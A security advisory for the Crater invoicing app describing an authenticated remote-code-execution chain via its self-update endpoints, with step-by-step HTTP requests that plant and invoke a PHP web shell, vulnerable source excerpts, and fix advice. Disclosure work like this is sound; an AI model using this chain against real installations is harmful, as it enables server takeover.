### Vulnerability details

**Official website / Product:** https://github.com/crater-invoice-inc/crater

**Repository:** crater-invoice-inc/crater (stars at selection: 8356)

**Vulnerability type:** getshell / RCE

**Vulnerability versions:** master `05d5ce26` (6.0.6 / current default branch)

**Vulnerability URL / Parameter:** `POST /api/v1/update/unzip` (`path`), `POST /api/v1/update/copy` (`path`); optional staging via `POST /api/v1/modules/upload`

**Complex:** yes

### Verification procedure

1. As Owner, craft a ZIP containing `Crater/public/r1a4_copy_shell.php`.
2. Stage it under `storage/app/temp-*/` via `/api/v1/modules/upload`.
3. `POST /api/v1/update/unzip` with `path` pointing at that ZIP.
4. `POST /api/v1/update/copy` with the extract directory; `Updater::copyFiles` copies `Crater/` onto the app root.
5. Request `/r1a4_copy_shell.php?c=id`.

Vulnerability HTTP request:

```http
POST /api/v1/update/unzip HTTP/1.1
Host: 127.0.0.1:18104
Authorization: Bearer <token>
company: 1
Content-Type: application/json

{"path":"/var/www/storage/app/temp-.../CopyEvil.zip"}

POST /api/v1/update/copy HTTP/1.1
Host: 127.0.0.1:18104
Authorization: Bearer <token>
company: 1
Content-Type: application/json

{"path":"/var/www/storage/app/temp2-..."}

GET /r1a4_copy_shell.php?c=id HTTP/1.1
Host: 127.0.0.1:18104
```

Verification result:

copy returns `{"success":true,"path":true}`. `GET /r1a4_copy_shell.php?c=id` prints `TMP-r1a4-3 uid=1000(crater-user) ...`.

### Vulnerability analysis

The self-update flow trusts client-supplied `path` and never authenticates update packages. `Updater::copyFiles` runs:

```php
File::copyDirectory($temp_extract_dir.'/Crater', base_path());
```

An attacker places arbitrary `Crater/public/*.php` inside the ZIP (no zip-slip required). Module upload is a convenient staging vector. On PHP 8.1+, `extractTo` mitigates `../`, yet this chain still yields getshell — distinct root cause from CVE-2026-57863.

Vulnerable trigger / sink source (complete path and line numbers):

```php
# File: app/Space/Updater.php
# Lines: 119-128
public static function copyFiles($temp_extract_dir)
{
    if (! File::copyDirectory($temp_extract_dir.'/Crater', base_path())) {
        return false;
    }
    File::deleteDirectory($temp_extract_dir);
    return true;
}
```

```php
# File: app/Http/Controllers/V1/Admin/Update/CopyFilesController.php
# Lines: 17-36
public function __invoke(Request $request)
{
    if ((! $request->user()) || (! $request->user()->isOwner())) {
        return response()->json([...], 401);
    }
    $request->validate(['path' => 'required']);
    $path = Updater::copyFiles($request->path);  // client-controlled path
    return response()->json(['success' => true, 'path' => $path]);
}
```

### Vulnerability Fix

1. Cryptographically verify update packages; reject unsigned archives.
2. Constrain `path` to server-issued temp directories; never trust client absolute paths.
3. Exclude executable suffixes under `public/` from update copies, or verify tree integrity after copy.
